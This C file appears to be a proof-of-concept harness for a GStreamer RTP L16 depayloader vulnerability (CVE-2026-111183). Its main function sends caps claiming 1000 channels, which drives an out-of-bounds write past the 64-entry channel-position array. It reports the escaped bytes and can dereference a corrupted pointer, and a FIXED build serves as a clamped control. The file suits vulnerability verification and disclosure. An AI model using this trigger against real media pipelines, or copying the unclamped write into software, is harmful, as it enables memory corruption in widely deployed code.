/* Live GStreamer harness for CVE-2026-111183 / GHSA-62fg-53h6-6f68.
 *
 * Honest scope: real GLib 2.80 / GStreamer 1.24 GObject allocation and real
 * GstAudioInfo / GstRTPBaseDepayload types; the ACTUAL pinned vulnerable
 * gstrtpchannels.c is compiled in; the set_caps body is a faithful copy of
 * pinned depay.c:140-230. This is not the full plugin binary.
 */
#include <gst/gst.h>
#include <gst/rtp/gstrtpbasedepayload.h>
#include <gst/rtp/gstrtppayloads.h>
#include <gst/audio/audio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "gstrtpchannels.h"

/* Static pad templates mirroring depay.c:53-81, so base class allocates pads. */
static GstStaticPadTemplate live_src_template =
GST_STATIC_PAD_TEMPLATE ("src", GST_PAD_SRC, GST_PAD_ALWAYS,
    GST_STATIC_CAPS ("audio/x-raw, format=(string)S16BE, "
        "rate=(int)[1,MAX], channels=(int)[1,MAX]"));
static GstStaticPadTemplate live_sink_template =
GST_STATIC_PAD_TEMPLATE ("sink", GST_PAD_SINK, GST_PAD_ALWAYS,
    GST_STATIC_CAPS ("application/x-rtp, media=(string)audio, "
        "clock-rate=(int)[1,MAX], encoding-name=(string)L16"));

#ifdef FIXED
/* Fixed control: upstream's MIN(channels, G_N_ELEMENTS(posn)) clamp. */
static void
fixed_create_default (gint channels, GstAudioChannelPosition * posn)
{
  gint i, n = channels;
  if (n > 64)
    n = 64;
  for (i = 0; i < n; i++)
    posn[i] = GST_AUDIO_CHANNEL_POSITION_NONE;
}
#endif

/* pinned depay.h:47-53, reproduced verbatim against installed types */
typedef struct _LiveDepay {
  GstRTPBaseDepayload depayload;
  GstAudioInfo info;
  const GstRTPChannelOrder *order;
} LiveDepay;

typedef struct _LiveDepayClass {
  GstRTPBaseDepayloadClass parent_class;
} LiveDepayClass;

G_DEFINE_TYPE (LiveDepay, live_depay, GST_TYPE_RTP_BASE_DEPAYLOAD)

static gint
parse_int (GstStructure * s, const gchar * field, gint def)
{
  const gchar *str;
  gint res;
  if ((str = gst_structure_get_string (s, field)))
    return atoi (str);
  if (gst_structure_get_int (s, field, &res))
    return res;
  return def;
}

/* Faithful copy of pinned depay.c:140-230 (only the warning macro is shortened). */
static gboolean
live_setcaps (GstRTPBaseDepayload * depayload, GstCaps * caps)
{
  GstStructure *structure;
  LiveDepay *dep;
  gint clock_rate, payload, channels;
  GstCaps *srccaps;
  gboolean res;
  const gchar *channel_order;
  const GstRTPChannelOrder *order;
  GstAudioInfo *info;

  dep = (LiveDepay *) depayload;
  structure = gst_caps_get_structure (caps, 0);

  payload = 96;
  gst_structure_get_int (structure, "payload", &payload);
  switch (payload) {
    case GST_RTP_PAYLOAD_L16_STEREO:
      channels = 2;
      clock_rate = 44100;
      break;
    case GST_RTP_PAYLOAD_L16_MONO:
      channels = 1;
      clock_rate = 44100;
      break;
    default:
      channels = 0;
      clock_rate = 0;
      break;
  }

  clock_rate = parse_int (structure, "clock-rate", clock_rate);
  if (clock_rate == 0)
    return FALSE;

  channels = parse_int (structure, "encoding-params", channels);
  if (channels == 0) {
    channels = parse_int (structure, "channels", channels);
    if (channels == 0)
      channels = 1;
  }

  depayload->clock_rate = clock_rate;

  info = &dep->info;
  gst_audio_info_init (info);
  info->finfo = gst_audio_format_get_info (GST_AUDIO_FORMAT_S16BE);
  info->rate = clock_rate;
  info->channels = channels;
  info->bpf = (info->finfo->width / 8) * channels;

  channel_order = gst_structure_get_string (structure, "channel-order");
  order = gst_rtp_channels_get_by_order (channels, channel_order);
  dep->order = order;                       /* NULL before the write, as pinned */
  if (order) {
    memcpy (info->position, order->pos,
        sizeof (GstAudioChannelPosition) * channels);
    gst_audio_channel_positions_to_valid_order (info->position, info->channels);
  } else {
    g_warning ("Unknown channel order '%s' for %d channels",
        GST_STR_NULL (channel_order), channels);
#ifdef FIXED
    fixed_create_default (channels, info->position);
#else
    gst_rtp_channels_create_default (channels, info->position);
#endif
    info->flags |= GST_AUDIO_FLAG_UNPOSITIONED;
  }

  srccaps = gst_audio_info_to_caps (info);
  res = gst_pad_set_caps (depayload->srcpad, srccaps);
  gst_caps_unref (srccaps);
  return res;
}

static void
live_depay_init (LiveDepay * dep)
{
}

static void
live_depay_class_init (LiveDepayClass * klass)
{
  GstRTPBaseDepayloadClass *base = (GstRTPBaseDepayloadClass *) klass;
  gst_element_class_add_static_pad_template ((GstElementClass *) klass, &live_src_template);
  gst_element_class_add_static_pad_template ((GstElementClass *) klass, &live_sink_template);
  base->set_caps = live_setcaps;
}

int
main (int argc, char **argv)
{
  gint channels = 1000;
  GstElement *elem;
  GstRTPBaseDepayload *dep;
  GstRTPBaseDepayloadClass *klass;
  GstCaps *caps;
  gchar *capsstr;
  gboolean res;
  size_t pos_off = offsetof (GstAudioInfo, position)
      + offsetof (LiveDepay, info);

  if (argc > 1)
    channels = atoi (argv[1]);

  gst_init (&argc, &argv);
  setvbuf (stdout, NULL, _IONBF, 0);

  printf ("sizeof(GstAudioInfo)=%zu position_off_in_info=%zu\n",
      sizeof (GstAudioInfo), offsetof (GstAudioInfo, position));
  printf ("sizeof(LiveDepay)=%zu position_off_in_instance=%zu\n",
      sizeof (LiveDepay), pos_off);
  printf ("channels=%d oob_writes=%d escape_bytes=%zd\n",
      channels, channels > 64 ? channels - 64 : 0,
      (ssize_t) (pos_off + 4 * channels) - (ssize_t) sizeof (LiveDepay));

  elem = g_object_new (live_depay_get_type (), NULL);   /* real GObject alloc */
  dep = GST_RTP_BASE_DEPAYLOAD (elem);
  klass = GST_RTP_BASE_DEPAYLOAD_GET_CLASS (dep);

  capsstr = g_strdup_printf ("application/x-rtp, media=(string)audio, "
      "clock-rate=(int)44100, encoding-name=(string)L16, "
      "encoding-params=(string)%d, payload=(int)96", channels);
  caps = gst_caps_from_string (capsstr);
  printf ("caps=%s\n", capsstr);

  res = klass->set_caps (dep, caps);
  printf ("setcaps_return=%d channels_field=%d order_ptr=%p\n",
      res, ((LiveDepay *) dep)->info.channels, (void *) ((LiveDepay *) dep)->order);
  if (argc > 2 && !strcmp (argv[2], "deref") && ((LiveDepay *) dep)->order) {
    /* Exact dereference of pinned depay.c:267 when a corrupted order is non-NULL. */
    volatile gpointer v = ((LiveDepay *) dep)->order->pos;
    printf ("deref_order_pos=%p\n", (void *) v);
  }

  gst_caps_unref (caps);
  g_free (capsstr);
  gst_object_unref (elem);
  return 0;
}
